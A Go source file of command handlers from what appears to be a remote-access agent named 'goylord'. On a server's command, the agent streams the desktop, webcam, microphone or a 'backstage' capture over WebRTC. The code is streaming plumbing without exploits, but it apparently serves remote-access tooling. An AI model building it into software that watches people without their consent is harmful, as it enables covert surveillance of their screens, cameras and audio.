package handlers

import (
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"net/url"
	"strings"

	"goylord-client/cmd/agent/capture"
	"goylord-client/cmd/agent/runtime"
	"goylord-client/cmd/agent/webrtcpub"
	"goylord-client/cmd/agent/wire"
)

func pcm16BytesToInt16(chunk []byte) []int16 {
	n := len(chunk) / 2
	out := make([]int16, n)
	for i := 0; i < n; i++ {
		out[i] = int16(binary.LittleEndian.Uint16(chunk[i*2:]))
	}
	return out
}

func kindFromPayload(payload map[string]interface{}) webrtcpub.Kind {
	switch s, _ := payload["kind"].(string); s {
	case "backstage":
		return webrtcpub.Kindbackstage
	case "webcam":
		return webrtcpub.KindWebcam
	case "audio":
		return webrtcpub.KindAudio
	default:
		return webrtcpub.KindDesktop
	}
}

func payloadBool(payload map[string]interface{}, key string, fallback bool) bool {
	if v, ok := payload[key].(bool); ok {
		return v
	}
	return fallback
}

func handleWebrtcPublish(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	whipPath, _ := payload["whipPath"].(string)
	token, _ := payload["token"].(string)
	if whipPath == "" || token == "" {
		sendCommandResultSafe(env, cmdID, false, "missing whipPath/token")
		return nil
	}

	kind := kindFromPayload(payload)
	hasVideo := payloadBool(payload, "hasVideo", kind != webrtcpub.KindAudio)
	hasAudio := payloadBool(payload, "hasAudio", kind == webrtcpub.KindAudio)

	whipURL, err := buildWhipURL(env, whipPath)
	if err != nil {
		sendCommandResultSafe(env, cmdID, false, err.Error())
		return nil
	}

	opts := webrtcpub.Options{
		WhipURL:               whipURL,
		PublishToken:          token,
		TLSInsecureSkipVerify: env.Cfg.TLSInsecureSkipVerify,
		TLSCAPath:             env.Cfg.TLSCAPath,
		HasVideo:              hasVideo,
		HasAudio:              hasAudio,
		ICEServers:            parseICEServers(payload),
	}

	goSafe("webrtc publish", env.Cancel, func() {
		if _, err := webrtcpub.Start(ctx, kind, opts); err != nil {
			log.Printf("webrtc: publish[%s] start failed: %v", kind, err)
			_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
				Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error(),
			})
			return
		}
		// Force a fresh SPS/PPS/IDR so the freshly subscribed viewer can
		// decode immediately instead of waiting for the next natural IDR.
		if hasVideo {
			if kind == webrtcpub.Kindbackstage {
				capture.ResetPrevbackstage()
			} else {
				capture.ResetPrev()
			}
		}
		_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: true,
		})
	})
	return nil
}

func handleWebrtcStop(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	_ = ctx
	if payload != nil {
		webrtcpub.Stop(kindFromPayload(payload))
	} else {
		webrtcpub.StopAll()
	}
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func handleWebrtcP2POffer(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	sessionID, _ := payload["sessionId"].(string)
	offerSDP, _ := payload["sdp"].(string)
	if sessionID == "" || offerSDP == "" {
		sendCommandResultSafe(env, cmdID, false, "missing sessionId/sdp")
		return nil
	}
	kind := kindFromPayload(payload)
	hasVideo := payloadBool(payload, "hasVideo", kind != webrtcpub.KindAudio)
	hasAudio := payloadBool(payload, "hasAudio", kind == webrtcpub.KindAudio)
	kindStr := string(kind)

	callbacks := webrtcpub.P2POfferCallbacks{
		OnICE: func(c webrtcpub.ICECandidate) {
			if c.Candidate == "" {
				return
			}
			_ = wire.WriteMsg(ctx, env.Conn, wire.WebRTCP2PIce{
				Type:          "webrtc_p2p_ice",
				SessionID:     sessionID,
				Kind:          kindStr,
				Candidate:     c.Candidate,
				SDPMid:        c.SDPMid,
				SDPMLineIndex: c.SDPMLineIndex,
			})
		},
		OnClose: func() {
			log.Printf("webrtc: P2P[%s/%s] session closed", kind, sessionID)
		},
	}

	answerSDP, err := webrtcpub.StartP2POffer(ctx, kind, sessionID, offerSDP, callbacks, hasVideo, hasAudio, parseICEServers(payload))
	if err != nil {
		sendCommandResultSafe(env, cmdID, false, err.Error())
		return nil
	}
	if hasVideo {
		if kind == webrtcpub.Kindbackstage {
			capture.ResetPrevbackstage()
		} else {
			capture.ResetPrev()
		}
	}
	_ = wire.WriteMsg(ctx, env.Conn, wire.WebRTCP2PAnswer{
		Type:      "webrtc_p2p_answer",
		SessionID: sessionID,
		Kind:      kindStr,
		SDP:       answerSDP,
	})
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func handleWebrtcP2PIce(_ context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	sessionID, _ := payload["sessionId"].(string)
	candidate, _ := payload["candidate"].(string)
	mid, _ := payload["sdpMid"].(string)
	var idx uint16
	if v, ok := payloadInt32(payload, "sdpMLineIndex"); ok {
		idx = uint16(v)
	}
	kind := kindFromPayload(payload)
	webrtcpub.AddP2PICECandidate(kind, sessionID, webrtcpub.ICECandidate{
		Candidate:     candidate,
		SDPMid:        mid,
		SDPMLineIndex: idx,
	})
	_ = env
	_ = cmdID
	return nil
}

func handleWebrtcP2PStop(_ context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	sessionID, _ := payload["sessionId"].(string)
	if sessionID == "" {
		webrtcpub.StopAllP2P()
	} else {
		webrtcpub.StopP2P(kindFromPayload(payload), sessionID)
	}
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func parseICEServers(payload map[string]interface{}) []webrtcpub.ICEServer {
	raw, ok := payload["iceServers"]
	if !ok || raw == nil {
		return nil
	}
	list, ok := raw.([]interface{})
	if !ok || len(list) == 0 {
		return nil
	}
	var out []webrtcpub.ICEServer
	for _, item := range list {
		m, ok := item.(map[string]interface{})
		if !ok {
			continue
		}
		var srv webrtcpub.ICEServer
		if urls, ok := m["urls"].([]interface{}); ok {
			for _, u := range urls {
				if s, ok := u.(string); ok && s != "" {
					srv.URLs = append(srv.URLs, s)
				}
			}
		}
		if len(srv.URLs) == 0 {
			continue
		}
		srv.Username, _ = m["username"].(string)
		srv.Credential, _ = m["credential"].(string)
		out = append(out, srv)
	}
	return out
}

func buildWhipURL(env *runtime.Env, whipPath string) (string, error) {
	if len(env.Cfg.ServerURLs) == 0 {
		return "", fmt.Errorf("no server URLs configured")
	}
	idx := env.Cfg.ServerIndex
	if idx < 0 || idx >= len(env.Cfg.ServerURLs) {
		idx = 0
	}
	base, err := url.Parse(env.Cfg.ServerURLs[idx])
	if err != nil {
		return "", fmt.Errorf("parse server url: %w", err)
	}
	switch strings.ToLower(base.Scheme) {
	case "wss":
		base.Scheme = "https"
	case "ws":
		base.Scheme = "http"
	}
	if !strings.HasPrefix(whipPath, "/") {
		whipPath = "/" + whipPath
	}
	base.Path = whipPath
	base.RawQuery = ""
	base.Fragment = ""
	return base.String(), nil
}
